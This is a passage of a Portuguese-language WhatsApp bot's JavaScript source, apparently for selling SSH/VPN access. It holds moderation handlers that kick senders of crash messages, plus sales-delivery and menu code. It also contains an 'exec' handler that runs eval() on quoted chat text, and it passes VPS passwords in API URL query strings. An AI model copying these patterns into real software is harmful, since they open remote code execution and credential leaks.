clear = `üóëÔ∏è\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nüóëÔ∏è\n‚ù≤‚ùó‚ù≥ *L…™·¥ç·¥ò·¥á·¥¢·¥Ä ·¥Ö·¥á C ú·¥Ä·¥õ C·¥è…¥·¥Ñ ü·¥ú…™ÃÅ·¥Ö·¥Ä* ‚úÖ`
conn.sendMessage(from, {text: clear}, {quoted: selo, contextInfo : { forwardingScore: 500, isForwarded:true}})
await sleep(3000);
await conn.sendMessage(from, { text: 'reporte ao adm o ocorrido '}, {quoted:selo})
}

if(isBotGroupAdmins && isAntiCtt && type === 'contactsArrayMessage') {
if(isGroupAdmins) return conn.sendMessage(from, {text: 'Contato detectado, voc√™ √© adm, ent√£o n√£o irei ti remover'}, {quoted: info})
await conn.sendMessage(from, {text: 'opa fechado pelo bot detectado trava contatos'}, {quoted: selo})
await conn.groupSettingUpdate(from, 'announcement')
await sleep(2000);
Kic = `${sender.split("@")[0]}@s.whatsapp.net`
conn.groupParticipantsUpdate(from, [sender], 'remove')
await sleep(2000);
await conn.sendMessage(from, { text: 'o grupo sera limpado para evitar fazer efeito da trava'}, {quoted:selo})
await sleep(3000);
clear = `üóëÔ∏è\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nüóëÔ∏è\n‚ù≤‚ùó‚ù≥ *L…™·¥ç·¥ò·¥á·¥¢·¥Ä ·¥Ö·¥á C ú·¥Ä·¥õ C·¥è…¥·¥Ñ ü·¥ú…™ÃÅ·¥Ö·¥Ä* ‚úÖ`
conn.sendMessage(from, {text: clear}, {quoted: selo, contextInfo : { forwardingScore: 500, isForwarded:true}})
await sleep(3000);
await conn.sendMessage(from, { text: 'agora enviarei destrava aguarde '}, {quoted:selo})
await sleep(2000);
await conn.sendMessage(from, {text: destrava(prefix)}, {quoted: selo})
await sleep(2000);
await conn.sendMessage(from, {text: destrava(prefix)}, {quoted: selo})
await sleep(2000);
await conn.sendMessage(from, { text: 'reporte ao adm o ocorrido '}, {quoted:selo})
await sleep(5000);
await conn.groupSettingUpdate(from, 'not_announcement')
await sleep(2000);
await conn.sendMessage(from, { text: 'Aberto nao marque a trava ou levara ban‚úÖ'}, {quoted:selo})
}

if(isBotGroupAdmins && Antiloc && type === 'locationMessage') {
if(isGroupAdmins) return conn.sendMessage(from, {text: 'Localiza√ß√£o detectada, voc√™ √© adm, ent√£o n√£o irei ti remover'}, {quoted: info})
await conn.sendMessage(from, {text: 'opa fechado pelo bot, detectado trava Localiza√ß√£o ou localiza√ß√£o comum, caso for um engano, fale com algum adm.'}, {quoted: selo})
await conn.groupSettingUpdate(from, 'announcement')
await sleep(2000);
Kic = `${sender.split("@")[0]}@s.whatsapp.net`
conn.groupParticipantsUpdate(from, [sender], 'remove')
await sleep(2000);
await conn.sendMessage(from, { text: 'o grupo sera limpado para evitar fazer efeito da trava'}, {quoted:selo})
await sleep(3000);
clear = `üóëÔ∏è\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nüóëÔ∏è\n‚ù≤‚ùó‚ù≥ *L…™·¥ç·¥ò·¥á·¥¢·¥Ä ·¥Ö·¥á C ú·¥Ä·¥õ C·¥è…¥·¥Ñ ü·¥ú…™ÃÅ·¥Ö·¥Ä* ‚úÖ`
conn.sendMessage(from, {text: clear}, {quoted: selo, contextInfo : { forwardingScore: 500, isForwarded:true}})
await sleep(3000);
await conn.sendMessage(from, { text: 'agora enviarei destrava aguarde '}, {quoted:selo})
await sleep(2000);
await conn.sendMessage(from, {text: destrava(prefix)}, {quoted: selo})
await sleep(2000);
await conn.sendMessage(from, {text: destrava(prefix)}, {quoted: selo})
await sleep(2000);
await conn.sendMessage(from, { text: 'reporte ao adm o ocorrido '}, {quoted:selo})
await sleep(5000);
await conn.groupSettingUpdate(from, 'not_announcement')
await sleep(2000);
await conn.sendMessage(from, { text: 'Aberto nao marque a trava ou levara ban‚úÖ'}, {quoted:selo})
}

if(isBotGroupAdmins && isAnticatalogo && type === 'productMessage') {
if(isGroupAdmins) return conn.sendMessage(from, {text: 'Catalogo detectado, voc√™ √© adm, ent√£o n√£o irei ti remover'}, {quoted: info})
await conn.sendMessage(from, {text: 'opa fechado pelo bot, detectado trava Catalogo ou Catalogo comum, caso for um engano, fale com algum adm.'}, {quoted: selo})
await conn.groupSettingUpdate(from, 'announcement')
await sleep(2000);
Kic = `${sender.split("@")[0]}@s.whatsapp.net`
conn.groupParticipantsUpdate(from, [sender], 'remove')
await sleep(2000);
await conn.sendMessage(from, { text: 'o grupo sera limpado para evitar fazer efeito da trava'}, {quoted:selo})
await sleep(3000);
clear = `üóëÔ∏è\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nüóëÔ∏è\n‚ù≤‚ùó‚ù≥ *L…™·¥ç·¥ò·¥á·¥¢·¥Ä ·¥Ö·¥á C ú·¥Ä·¥õ C·¥è…¥·¥Ñ ü·¥ú…™ÃÅ·¥Ö·¥Ä* ‚úÖ`
conn.sendMessage(from, {text: clear}, {quoted: selo, contextInfo : { forwardingScore: 500, isForwarded:true}})
await sleep(3000);
await conn.sendMessage(from, { text: 'agora enviarei destrava aguarde '}, {quoted:selo})
await sleep(2000);
await conn.sendMessage(from, {text: destrava(prefix)}, {quoted: selo})
await sleep(2000);
await conn.sendMessage(from, {text: destrava(prefix)}, {quoted: selo})
await sleep(2000);
await conn.sendMessage(from, { text: 'reporte ao adm o ocorrido '}, {quoted:selo})
await sleep(5000);
await conn.groupSettingUpdate(from, 'not_announcement')
await sleep(2000);
await conn.sendMessage(from, { text: 'Aberto nao marque a trava ou levara ban‚úÖ'}, {quoted:selo})
}

if (budy.length >= limitefl) { 
if(!isAntiFlood) return
if(isAntiFlood && isGroupAdmins && isBotGroupAdmins && isPremium) {
if(isBot) return 
reply('*Link detectado, por√©m usu√°rio √© admin*')
} else {
if(SoDono) return
if(isGroupAdmins) return
if(isPremium) return
var Kic = `${sender.split("@")[0]}@s.whatsapp.net`  
setTimeout( () => {
if(!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe && !isGroupAdmins) return reply('Muitas caracter√≠sticas enviadas, eu afirmo que pode ser trava, por precau√ß√µes, eu irei remover.')
console.log(color('deram Spam','red'))
}, 100)
setTimeout( () => {
conn.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
setTimeout( () => {
}, 0)
}
}

//AREA DE ENVIO SSH P√ìS COMPRA
switch(testat){
}

if (budy2.includes(`${delivery1}`)){
  if(!SoDono) return reply("S√≥ dono...")
  var nomor = info.participant
  sug = `*NOVA VENDA REALIZADA ü§©*\n\nSeu site fez uma nova venda  e estou aqui para notific√°-lo\n*Parab√©ns* üéâ\n\n*Whatsapp do cliente:*\n\nwa.me/${sender.split("@s.whatsapp.net")[0]}\n\nQualquer d√∫vida acesse\n\ngestorvip.com`
  await conn.sendMessage(`${setting.numerodono}@s.whatsapp.net`, {text: sug}, {quoted: info, quoted: selo})
  server = await fetchJson(`https://apirest.gestorvip.com/api/ssh?ip=${ipvps}&user=${uservps}&pass=${senhavps}&app=${linkapp}&apikey=${apipremium}`)
  if (server.error) return reply(server.error)
  botaoale = [
  {title: "Qualquer D√∫vida contate seu provedor",
  rows: [
  {title: "Obrigado", rowId: `${prefix}reagir`}]
  }]
  sendlistA(from, "\n", `‚û• üë§ùêîùêíùêîùêÄùêëùêàùêé: ${server.user}\n‚û• üîíùêíùêÑùêçùêáùêÄ:   ${server.pass}\n‚û• üî•LIMITE: ${server.limit}\n‚û• üìÜDias: ${server.valid}\n\n‚û• *LINK DO APP*\n*${linkapp}*`, `${server.type}`, "OBRIGADO :)", botaoale)
  }

        //plano2\\
	  
if (budy2.includes(`${delivery2}`)){
  if(!SoDono) return reply("S√≥ dono...")
  var nomor = info.participant
  sug = `*NOVA VENDA REALIZADA ü§©*\n\nSeu site fez uma nova venda  e estou aqui para notific√°-lo\n*Parab√©ns* üéâ\n\n*Whatsapp do cliente:*\n\nwa.me/${sender.split("@s.whatsapp.net")[0]}\n\nQualquer d√∫vida acesse\n\ngestorvip.com`
  await conn.sendMessage(`${setting.numerodono}@s.whatsapp.net`, {text: sug}, {quoted: info, quoted: selo})
  server = await fetchJson(`https://apirest.gestorvip.com/api/ssh2?ip=${ipvps}&user=${uservps}&pass=${senhavps}&app=${linkapp}&apikey=${apipremium}`)
  if (server.error) return reply(server.error)
  botaoale = [
  {title: "Qualquer D√∫vida contate seu provedor",
  rows: [
  {title: "Obrigado", rowId: `${prefix}reagir`}]
  }]
  sendlistA(from, "\n", `‚û• üë§ùêîùêíùêîùêÄùêëùêàùêé: ${server.user}\n‚û• üîíùêíùêÑùêçùêáùêÄ:   ${server.pass}\n‚û• üî•LIMITE: ${server.limit}\n‚û• üìÜDias: ${server.valid}\n\n‚û• *LINK DO APP*\n*${linkapp}*`, `${server.type}`, "OBRIGADO :)", botaoale)
  }

        //plano3\\
	  
if (budy2.includes(`${delivery3}`)){
  if(!SoDono) return reply("S√≥ dono...")
  var nomor = info.participant
  sug = `*NOVA VENDA REALIZADA ü§©*\n\nSeu site fez uma nova venda  e estou aqui para notific√°-lo\n*Parab√©ns* üéâ\n\n*Whatsapp do cliente:*\n\nwa.me/${sender.split("@s.whatsapp.net")[0]}\n\nQualquer d√∫vida acesse\n\ngestorvip.com`
  await conn.sendMessage(`${setting.numerodono}@s.whatsapp.net`, {text: sug}, {quoted: info, quoted: selo})
  server = await fetchJson(`https://apirest.gestorvip.com/api/ssh3?ip=${ipvps}&user=${uservps}&pass=${senhavps}&app=${linkapp}&apikey=${apipremium}`)
  if (server.error) return reply(server.error)
  botaoale = [
  {title: "Qualquer D√∫vida contate seu provedor",
  rows: [
  {title: "Obrigado", rowId: `${prefix}reagir`}]
  }]
  sendlistA(from, "\n", `‚û• üë§ùêîùêíùêîùêÄùêëùêàùêé: ${server.user}\n‚û• üîíùêíùêÑùêçùêáùêÄ:   ${server.pass}\n‚û• üî•LIMITE: ${server.limit}\n‚û• üìÜDias: ${server.valid}\n\n‚û• *LINK DO APP*\n*${linkapp}*`, `${server.type}`, "OBRIGADO :)", botaoale)
}

if(messagesC.includes('exec')) {
if(!SoDono && !isnit && !issupre && !ischyt) return
try{
paramsQuoted = info.message.extendedTextMessage.contextInfo.quotedMessage.conversation || info.message.extendedTextMessage.contextInfo.quotedMessage.extendedTextMessage.text;	
return eval(`${paramsQuoted}`)
console.log(`[EXEC]~> ${paramsQuoted}`)
}catch(e){
reply(e)
}
}

if (messagesC == "corno"){
tujuh = fs.readFileSync('./audios/corno.mp3');
await conn.sendMessage(from, {audio: tujuh, mimetype: 'audio/mp4', ptt:true}, {quoted: info})
}

//==============(ANTILINK)===============\\

switch(ants){
} 

//=========[--ANTI PALAVR√ÉO --]==========\\
if (isGroup && isPalavrao) { //CREDITOS TIAGO
 if (palavra.includes(budy2)) {
 if (!isGroupAdmins) {
 conn.sendMessage(from, {text: `SEM PALAVR√ÉO!! üò†!!`}, {quoted : info})       
setTimeout( () => {
conn.groupParticipantsUpdate(from, [sender], 'remove')
}, 2000)
reply("2")
setTimeout( () => {
reply("1")
}, 1000)
setTimeout( () => {
conn.sendMessage(from, {text: `*„Äå üó£Ô∏èANTI PALAVR√ÉOüó£Ô∏è „Äç*\nVoc√™ ser√° banido do gp, Na proxima tenha √©tica ao falar!!`}, {quoted : info}).catch(e => {
conn.sendMessage(from, {text: `InFelizmente, n√£o sou um administrador, entt n√£o posso te banir!!`}, {quoted : info})
})       							
}, 0)
} else {
return reply(`VOC√ä PODE ${pushname} üòá`)
}
}
}

 
//================(SIMIH-2)=================\\

if (isSimi2 && !isCmd && isGroup) {
if (type == 'conversation' || type == 'extendedTextMessage') {
if (info.key.fromMe) return
if (type == 'extendedTextMessage' && prefix.includes(info.message.extendedTextMessage.contextInfo.quotedMessage.conversation[0])) return
insert(type, info)
const sami = await response(budy)

if (sami) conn.sendMessage(from, {text: sami, thumbnail: blalogoofc}, {quoted: info});
}
}


 //===============(SIMIH-1)===============\\
    
if (isGroup && isSimi && budy != undefined) {
if(type == 'imageMessage') return 
if(type == 'audioMessage') return 
if(type == 'stickerMessage') return   
if(info.key.fromMe) return 
console.log(budy)
muehe = await simih(budy)
console.log(muehe)
reply(muehe)
}


//========================================\\

hora2 = moment.tz('America/Sao_Paulo').format('HH:mm:ss');

if (isCmd) {
uptime = process.uptime()  
sug = `
*BEM VINDO Sr.(¬™)*

‚ùñ *${pushname}*
‚ùñ *Seu n√∫mero:* ${sender.split("@")[0]}
‚óÜ ‚îÅ‚îÅ‚îÅ‚îÅ‚úß‚îÅ‚îÅ‚îÅ‚îÅ ‚óÜ

Compre o seu acesso SSH com o menor pre√ßo do mercado, melhor qualidade e melhor suporte, confira nossos planos ou fa√ßa um *Teste Gratuito* conosco .
`
botaoale = [
{title: "BEM VINDO AO MENU",
rows: [
{title: "‚Ç™ ùó£ùóüùóîùó°ùó¢ùó¶ ùóóùóò ùóúùó°ùóßùóòùó•ùó°ùóòùóß ùó¶ùó¶ùóõ ", rowId: `${prefix}compraracesso`, description: "compre seu acesso vip"},
{title: "‚Ç™ ùóöùóòùó•ùóîùó• ùóßùóòùó¶ùóßùóò ùó©ùó£ùó° ùó¶ùó¶ùóõ ", rowId: `${prefix}sshgratis`, description: "Teste autom√°tico"},
{title: "‚ü± ùóïùóîùóúùó´ùóîùó• ùóîùó£ùóüùóúùóñùóîùóßùóúùó©ùó¢      ", rowId: `${prefix}baixarapp`, description: "Aplicativo de conex√£o"},
{title: "‚úÜ ùóôùóîùóüùóîùó• ùóñùó¢ùó† ùó¢ ùó¶ùó®ùó£ùó¢ùó•ùóßùóò ", rowId: `${prefix}suporte`, description: "Notificar o dono"}]
}]
sendlistA(from, `${sug}`, `Acesse o menu para ver as op√ß√µes`, `${NomeDoBot}`, "MENU", botaoale)
  const reactionMessage = {
react: {
text: "üò∞",
key: info.key
}
}
sendMsg = await conn.sendMessage(from, reactionMessage)
}
//========================================\\

}
} catch (e) {
if(String(e).includes("rate-overlimit")) {
console.log(color("Ignore esta mensagem..", "gray"))
} else if(String(e).includes("at async groupMetadata")) {
console.log(color("Ignore esta mensagem..", "gray"))  
} else if(String(e).includes("Unknown error")) {
console.log(color("Error Desconhecido, ignore esta mensagem..", "gray"))
} else if(String(e).includes("Timed Out")) {
console.log(color("Error de Timed Out, apenas ignore esta mensagem..", "gray"))
} else {
console.log(e)
}
}

})

conn.ev.on('connection.update', (update) => {
require("./conect.js")(conn, update)
})

conn.ev.on('creds.update', saveState) 

return conn
 
}

startAle()

exports.startAle = startAle
